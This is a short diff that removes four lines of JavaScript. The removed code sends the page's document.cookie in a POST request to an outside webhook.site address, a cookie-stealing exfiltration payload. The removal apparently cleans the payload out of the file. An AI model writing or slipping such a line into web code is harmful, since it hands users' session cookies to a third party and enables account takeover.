@@ -1,4 +1,0 @@
-fetch('https://webhook.site/a15143d7-5478-4b56-8dd1-1bc586dd43fd', {
-  method: 'POST',
-  body: document.cookie
-});
